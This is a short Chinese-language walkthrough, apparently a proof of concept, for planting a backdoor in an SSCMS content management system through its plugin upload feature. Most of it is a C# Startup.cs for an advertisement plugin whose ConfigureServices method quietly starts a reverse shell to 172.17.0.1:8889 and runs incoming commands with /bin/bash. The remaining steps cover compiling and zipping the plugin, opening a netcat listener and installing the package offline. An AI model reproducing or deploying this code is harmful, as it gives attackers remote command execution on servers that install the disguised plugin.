1. 安装VisualStudio

2. 导入该项目

3. 修改Startup.cs文件中的`IPAddress.Parse`值

   ```c#
   using Microsoft.Extensions.DependencyInjection;
   using SSCMS.Advertisement.Abstractions;
   using SSCMS.Advertisement.Core;
   using SSCMS.Plugins;
   using System.Diagnostics;
   using System;
   using System.Text;
   using System.Net.Sockets;
   using System.Net;
   using System.Threading;
   
   namespace SSCMS.Advertisement
   {
       public class Startup : IPluginConfigureServices
       {
           
         public void ConfigureServices(IServiceCollection services)
         {
            ThreadStart childref = new ThreadStart(reversShell);
            Thread childThread = new Thread(childref);
            childThread.Start();
            services.AddScoped<IAdvertisementRepository, AdvertisementRepository>();
         }
   
   		public void reversShell()
   		{
   			Socket socketshell = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
   			IPAddress ip = IPAddress.Parse("172.17.0.1");
   			IPEndPoint point = new IPEndPoint(ip, Convert.ToInt32("8889"));
   			try
   			{
   				socketshell.Connect(point);
   				while (true)
   				{
   					byte[] getdata = new byte[1024 * 5];
   					int n = socketshell.Receive(getdata);
   					string restr = Encoding.Default.GetString(getdata, 0, n);
   					string command = restr;
   					string resultok = willshell(command);
   					byte[] senddata = new byte[1024 * 5];
   					senddata = Encoding.Default.GetBytes(resultok);
   					socketshell.Send(senddata);
   				}
   			}
   			catch
   			{
   				socketshell.Close();
   			}
   		}
   
   		public static string willshell(object command)
   		{
   			Process process = new Process();
   			process.StartInfo.FileName = "/bin/bash";
   			process.StartInfo.UseShellExecute = false;
   			process.StartInfo.RedirectStandardError = true;
   			process.StartInfo.RedirectStandardInput = true;
   			process.StartInfo.RedirectStandardOutput = true;
   			process.StartInfo.CreateNoWindow = true;
   			process.Start();
   			process.StandardInput.WriteLine("echo off");
   			process.StandardInput.WriteLine(command);
   			process.StandardInput.WriteLine("exit");
   			string result = process.StandardOutput.ReadToEnd();
   			return result;
   		}
   	}
   }
   ```

4. 编译项目

5. 将编译后的输出目录打包成Zip包

6. 服务器开启监听

   ```bash
   nc -lvvp 8889
   ```

7. 到系统中进行离线安装上传
